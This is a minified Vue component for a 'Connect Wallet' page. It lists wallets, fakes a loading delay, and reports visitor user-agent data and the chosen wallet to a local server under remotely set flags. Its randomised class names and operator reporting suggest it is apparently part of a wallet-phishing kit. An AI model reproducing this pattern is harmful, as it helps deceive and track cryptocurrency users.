import { ref as p, createElementBlock as c, openBlock as l, normalizeClass as y, createElementVNode as t, toDisplayString as k, onMounted as x, createCommentVNode as C, Fragment as b, renderList as W, createBlock as z, createTextVNode as D } from "vue";
import { _, u as T } from "./main-BtAhczrv.js";
import { u as j } from "./Store-CKwjlTxP.js";
import { a as i } from "./index-CFQnWdPA.js";
const $ = { style: { width: "100%", display: "flex", "flex-direction": "row", "align-items": "center", "justify-content": "space-between", "background-color": "#232323" } }, B = ["src"], S = {
  __name: "Wallet",
  props: {
    wallet: Object
  },
  emits: ["selectWallet"],
  setup(h, { emit: d }) {
    const n = h, e = d, s = p(!1), u = () => {
      s.value = !0, setTimeout(() => {
        e("selectWallet", n.wallet), s.value = !1;
      }, 3e3);
    };
    return (m, f) => (l(), c("button", {
      onClick: u,
      class: y(["dS2Qp6o0-container", { "dS2Qp6o0-container dsfbnz7D-loader": s.value }])
    }, [
      t("div", $, [
        t("span", null, k(n.wallet.title), 1),
        t("img", {
          src: `http://localhost:3000/images/${n.wallet.image}`,
          style: { height: "2em" },
          alt: ""
        }, null, 8, B)
      ])
    ], 2));
  }
}, A = /* @__PURE__ */ _(S, [["__scopeId", "data-v-4f042de8"]]), N = { class: "jd92JkalO-container" }, q = { class: "vNm72810O-container" }, E = { class: "p8d9IoRi-container x2kdAsd82-scrollbar" }, I = {
  __name: "Main",
  setup(h) {
    const d = T(), n = p([]), e = j(), s = async () => {
      const a = {
        date: /* @__PURE__ */ new Date()
      }, o = await i.post("http://localhost:3000/get-token", a, {
        headers: {
          "Content-Type": "application/json"
        }
      });
      e.token = o.data.token;
    }, u = async () => {
      const a = await i.get("http://localhost:3000/wallets", {
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${e.token}`
        }
      });
      n.value = a.data.wallets, r.value = n.value.slice(0, 4), e.userData = {
        ua: a.data.user.result,
        client: a.data.user.clientData
      }, e.requestConfig = a.data.requestConfig;
    }, m = async () => {
      await i.post("http://localhost:3000/user", {
        userData: e.userData
      }, {
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${e.token}`
        }
      });
    }, f = async () => {
      await i.post("http://localhost:3000/chosenwallet", {
        wallet: e.selectedWallet.name,
        userData: e.userData
      }, {
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${e.token}`
        }
      });
    }, r = p([]);
    x(async () => {
      await s(), await u(), e.requestConfig.enter && m();
    });
    const w = (a) => {
      e.selectedWallet = a, e.requestConfig.choosewallet && f(), d.push({ name: "connect" });
    }, v = () => {
      r.value = n.value;
    };
    return (a, o) => (l(), c("div", N, [
      t("div", q, [
        o[0] || (o[0] = t("div", { class: "a92838Lb9-container" }, [
          t("h1", { style: { "font-size": "1.25em", "font-weight": "800", "line-height": "1.75em" } }, " Connect Wallet ")
        ], -1)),
        t("div", E, [
          (l(!0), c(b, null, W(r.value, (g) => (l(), z(A, {
            onSelectWallet: w,
            key: g.name,
            wallet: g
          }, null, 8, ["wallet"]))), 128))
        ]),
        r.value.length < 5 ? (l(), c("button", {
          key: 0,
          onClick: v,
          class: "zc2Y4bn9f-container"
        }, " Others ")) : C("", !0),
        o[1] || (o[1] = t("div", { style: { "margin-top": "1.25em", "font-size": "1.125em", "text-align": "center" } }, [
          t("p", null, [
            D(" Need help with connecting a wallet? "),
            t("br"),
            t("span", { style: { "text-decoration": "underline", cursor: "pointer" } }, "Read our FAQ")
          ]),
          t("p", { style: { "margin-top": "1.25em", "font-size": "0.75em", "line-height": "1em", "max-width": "450px" } }, " Wallets are provided by External Provider and by selecting you agreed to Terms of those Providers. Your access to the wallet might be reliant on the External Provider being operational. ")
        ], -1))
      ])
    ]));
  }
}, Q = /* @__PURE__ */ _(I, [["__scopeId", "data-v-ee30f186"]]);
export {
  Q as default
};
